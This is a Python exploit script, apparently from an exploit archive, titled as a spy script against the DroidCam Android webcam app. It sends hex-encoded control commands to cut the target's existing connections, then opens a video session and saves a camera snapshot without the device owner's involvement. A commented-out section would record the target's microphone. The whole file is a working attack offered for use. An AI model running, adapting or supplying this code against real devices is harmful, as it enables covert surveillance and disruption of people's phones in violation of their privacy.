#!/usr/bin/python
# Title: DroidCam App Spy Script
# Desktop Client: https://www.dev47apps.com/
# Android App: https://play.google.com/store/apps/details?id=com.dev47apps.droidcam&hl=en_GB
# Tested on: DroidCam 6.9.2 - Android 10 and Windows 10 Pro Build 19042
# -*- coding: utf-8 -*-

# Commented sections indicate audio recording feature which is not yet functional
# Script in its current state is able to disconnect target's connections and grab a camera screenshot

# NOTES: App must be running to work!
# Will attempt to implement audio output to file and gif from image stream compiling features in future
# If pip install pyaudio produces error => apt-get install portaudio19-dev

import os
import sys
import string
from time import sleep
from scapy.all import *
import socket
#import pyaudio
#import wave

target = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
target_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
target_udp.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
udp_receive = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
udp_receive.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

#audio = pyaudio.PyAudio()
#FORMAT = pyaudio.paInt16
#CHANNELS = 1
#RATE = 44100
#CHUNK = 512

port = 4747
udp_port = 4748

def usage():
	print("[!] USAGE:   python " + sys.argv[0] + " <target-ip>")
#	print("[!] EXAMPLE: python " +sys.argv[0] + " 192.168.1.67 mic wlan0")
	exit()

def RSTAttack(rhost):
	try:
		close_data = "434d44202f76312f73746f70".decode("hex")
		target_udp.sendto(close_data,(rhost,udp_port))
		target_udp.sendto(close_data,(rhost,udp_port))
	except:
		print("[-] ERROR SENDING RST-ATTACK, TARGET APP RUNNING?")
		exit()

def connect(rhost):
	try:
		target.connect((rhost,port))
	except:
		print("[-] ERROR CONNECTING TO TARGET TCP PORT, TARGET APP RUNNING?")
		exit()

def ConnectDroidCam(rhost):
	try:
		target.sendto("434d44202f76332f766964656f2f6a70672f36343078343830".decode("hex"), (rhost,port))
		target.sendto("434d44202f76312f63746c3f333d6175746f".decode("hex"), (rhost,port))
	except:
		print("[-] ERROR CREATING VIDEO CONNECTION, TARGET APP RUNNING?")
		exit()
def Image():
	image_data = ""
	filename = "image.jpg"
	response1 = target.recv(1460)
	response2 = target.recv(1460)
	response3 = target.recv(1460)
	with open(filename, "ab") as a:
		if "JFIF" in response3:
			image_data = response3
			a.write(image_data[3:])
		else:
			image_data = target.recv(1460)
			a.write(image_data[3:])
		for b in range(1,30):
			image_data = target.recv(1460)
			if "JFIF" in image_data:
				a.write(image_data[3:])
			else:
				a.write(image_data)
		a.close()


#def ConnectDroidMic(rhost):
#	target_udp.sendto("434d44202f76322f617564696f".decode("hex"),(rhost,udp_port))
#	target_udp.sendto("434d44202f76322f617564696f".decode("hex"),(rhost,udp_port))

#def OutputAudio(seconds, bind_port):
#	#t_end = time.time() + seconds
#	udp_receive.bind(("", bind_port))
#	stream = audio.open(format=FORMAT, channels=CHANNELS,rate=RATE,frames_per_buffer=CHUNK, input=True)
#	#while time.time() < t_end:
#	for i in range(0, int(RATE / CHUNK * seconds)):
#		data,addr = udp_receive.recvfrom(140)
#		wav_dat = stream.read(data)
#		Recordedframes.append(wav_dat)
#	stream.stop_stream()
#	stream.close()
#	audio.terminate()
#	waveFile = wave.open("MicAudio.wav", "wb")
#	waveFile.setnchannels(CHANNELS)
#	waveFile.setsampwidth(audio.get_sample_size(FORMAT))
#	waveFile.setframerate(RATE)
#	waveFile.writeframes(b"".join(Recordedframes))
#	waveFile.close()

def exploit():
	try:
		rhost = str(sys.argv[1])
#		option = str(sys.argv[2])
#		interface = str(sys.argv[3])
#		if option == "cam":
		print("[+] RST-ING EXISTING CONNECTIONS")
		RSTAttack(rhost)
		print("[+] CONNECTING TO TARGET")
		sleep(2)
		connect(rhost)
		ConnectDroidCam(rhost)
		print("[+] SNAPPING A PIC THROUGH CAMERA")
		Image()				# Receive Image Data
#		elif option == "mic":
#		seconds = int(input("[+] HOW MANY SECONDS OF AUDIO?: "))
#		print("[+] RST-ING EXISTING CONNECTIONS")
#			RSTAttack(rhost)		# Disconnect any active sessions
#			print("[+] OPENING AUDIO CONNECTION")
#			sleep(2)
#			ConnectDroidMic(rhost)
#			print("[+] ENSURING AUDIO DATA HAS STARTED")
#			sleep(5)			# Buffer to allow audio stream to start
#			t = sniff(iface=interface, count=1, lfilter=lambda x: x.haslayer(UDP) and x[IP].src == rhost)
#			t = t[0]
#			packet_data = {"src": t[IP].src,"dst": t[IP].dst,"sport": t[UDP].sport,"dport": t[UDP].dport}
#			bind_port = int(packet_data["dport"])
#			OutputAudio(seconds, bind_port)
#		else:
#			usage()
	except Exception as e:
		usage()
		print("[-] AN ERROR OCCURRED?: " + e)


def main():
	exploit()
	exit()

if __name__=="__main__":
	main()